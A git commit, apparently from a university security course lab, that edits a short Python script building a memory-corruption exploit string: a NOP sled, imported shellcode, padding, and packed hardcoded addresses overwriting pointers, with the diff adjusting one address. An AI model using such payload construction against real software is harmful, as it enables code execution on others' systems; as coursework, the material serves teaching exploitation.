2f85018c5ae34dd4c56736dcb170ab7c2f09f787
Sujay Patwardhan <sujay.patwardhan@gmail.com>
2018-02-11 22:58:24 -0600

    kms

--- mp1/1.2.8.py
+++ mp1/1.2.8.py
@@ -1,10 +1,11 @@
 from struct import pack
 from shellcode import shellcode
 
-prev_a_addr = pack("<I", 0x080f3724)
-prev_b_addr = pack("<I", 0xbffeb8a8)
+#prev_a_addr = pack("<I", 0x080f3724)
+#prev_b_addr = pack("<I", 0xbffeb8a8)
 
-#print("\xaa"*4 + "\x6a\x0b\x58\x99" + shellcode + " " + "\xaa"*40 + pack("<I", 0xBFFEA6C8) + pack("<I", 0x080F3724) + " " + "\xaa"*4)
+prev_a_addr = pack("<I", 0x080f372a)
+prev_b_addr = pack("<I", 0xbffeb8a8)
 
 print("\x90"*8 + shellcode + " " + "\x69"*40 + prev_b_addr + prev_a_addr + " " + "\x69"*4)
 
